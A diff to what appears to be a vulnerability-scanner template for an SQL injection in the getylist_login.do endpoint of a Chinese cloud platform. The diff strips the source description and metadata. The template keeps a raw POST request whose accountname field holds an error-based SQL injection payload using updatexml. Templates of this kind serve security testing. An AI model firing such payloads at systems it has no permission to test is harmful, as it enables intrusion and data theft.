@@ -3,12 +3,8 @@ info:
   name: 海翔云平台 getylist_login.do SQL 注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/eesbwcghhwzz631m'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: eesbwcghhwzz631m
-    fofa: 暂无
 http:
 - raw:
   - 'POST /getylist_login.do HTTP/1.1
@@ -18,8 +14,6 @@ http:
 
 
     Content-Type: application/x-www-form-urlencoded; charset=UTF-8
-
-
 
 
     accountname=test'' and (updatexml(1,concat(0x7e,(select md5(123456)),0x7e),1));--
